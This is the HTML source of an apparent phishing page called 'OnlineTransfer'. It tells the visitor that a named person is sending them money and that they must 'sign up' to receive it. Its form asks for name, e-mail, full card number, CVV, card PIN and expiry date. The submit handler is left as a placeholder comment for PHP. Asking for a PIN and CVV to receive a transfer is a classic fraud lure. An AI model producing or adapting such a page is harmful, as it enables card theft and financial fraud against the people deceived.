<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OnlineTransfer</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Homenaje">
    
</head>
<body>
    <div class="navbar">
        <div class="logo">
            <img class="logo" src="https://cdn.discordapp.com/attachments/903734426926727218/1158514979188772924/image4.png?ex=651c86a7&is=651b3527&hm=3fce677790941bb262b8def6bb13ea0791715ddfc5ef691137d3628a4e654b90&">
        </div>
        <a href="#" class="login">login</a>
    </div>
    <hr>

    <div class="container">
        <div class="blur"></div>
        <h1 class="hero-section">User <span style="color:#EAAAFF">Amela Šehić</span> is sending<br>you an online transfer request.<br>Sign up and the money will<br>be transfered to your account.</h1>
        <form action="" method=""> <!-- PHP -->
            <h1 class="hero-section-mobile">User <span style="color:#EAAAFF">Amela Šehić</span> is sending<br>you an online transfer request.<br>Sign up and the money will<br>be transfered to your account.</h1>
            <input class="nameinput" type="text" for="fname" name="fname" id="fname" placeholder="First Name">
            <input class="nameinput" type="text" for="lname" name="lname" id="lname" placeholder="Last Name"><br>
            <label for="email">E-mail address:</label><br>
            <input id="email" class="nameinput" type="text" for="email" placeholder="example@email.com"><br>

            <label for="cardnumber">Card number:</label><br>
            <input type="text" placeholder="XXXX-XXXX-XXXX-XXXX" onkeypress="return isNumberKey(event)" minlength="17" maxlength="19" id="cardnumber" name="cardnumber" class="cardinput"><br>
            <label for="cvv">Card verification code:</label><br>
            <input type="text" name="cvv" id="cvv" minlength="3" maxlength="3" class="cardinput" onkeypress="return isNumberKey(event)"><br>
            <label for="pin">Card PIN code:</label><br>
            <input type="text" name="pin" id="pin" minlength="4" maxlength="6" class="cardinput" onkeypress="return isNumberKey(event)"><br>
            <label for="expdate">Card expiration date:</label><br>
            <select name="expmonth" id="expmonth">
                <option value="jan">January</option>
                <option value="feb">February</option>
                <option value="mar">March</option>
                <option value="apr">April</option>
                <option value="may">May</option>
                <option value="jun">June</option>
                <option value="jul">July</option>
                <option value="aug">August</option>
                <option value="sep">September</option>
                <option value="oct">October</option>
                <option value="nov">November</option>
                <option value="dec">December</option>
            </select>

            <select name="expyear" id="expyear">
                <option value="23">2023</option>
                <option value="24">2024</option>
                <option value="25">2025</option>
                <option value="26">2026</option>
                <option value="27">2027</option>
                <option value="28">2028</option>
                <option value="29">2029</option>
                <option value="30">2030</option>
                <option value="31">2031</option>
                <option value="32">2032</option>
                <option value="33">2033</option>
                <option value="34">2034</option>
            </select><br><br>
            <input type="submit" name="submit" id="submit" value="Sign Up">
        </form>

    </div>
    <script src="script.js"></script> 
</body>
</html>
